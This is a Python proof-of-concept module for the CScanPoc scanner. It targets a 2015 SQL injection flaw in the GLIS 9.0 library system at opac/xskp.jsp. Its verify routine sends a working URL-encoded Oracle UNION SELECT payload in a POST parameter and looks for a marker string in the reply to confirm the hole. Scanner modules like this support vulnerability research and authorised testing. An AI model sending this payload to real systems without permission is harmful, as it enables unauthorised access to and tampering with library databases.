# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'infosea_0011' # 平台漏洞编号，留空
    name = '北京清大新洋通用图书馆集成系统GLIS9.0 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-14'  # 漏洞公布时间
    desc = '''
        北京清大新洋通用图书馆集成系统GLIS9.0，存在注入漏洞： 
        opac/xskp.jsp
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '清大新洋'  # 漏洞应用名称
    product_version = '北京清大新洋通用图书馆集成系统GLIS9.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8f394182-bb1c-4404-ac6e-4a4c3f441e83'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0132188
            hh = hackhttp.hackhttp() 
            arg = self.target       
            payload = '/opac/xskp.jsp'
            postdata = 'kzh=zyk0040640%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2883%29%7C%7CCHR%2871%29%7C%7CCHR%2866%29%7C%7CCHR%28105%29%7C%7CCHR%28112%29%7C%7CCHR%28108%29%7C%7CCHR%28115%29%7C%7CCHR%2869%29%7C%7CCHR%2872%29%7C%7CCHR%28110%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%20FROM%20DUAL--%20&dztm=&dctm='
            code, head, res, errcode, _ = hh.http(arg + payload, postdata)

            if code == 200 and 'qqvvqSGBiplsEHnqzkzq' in res:
                #security_hole(arg+payload+'   :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
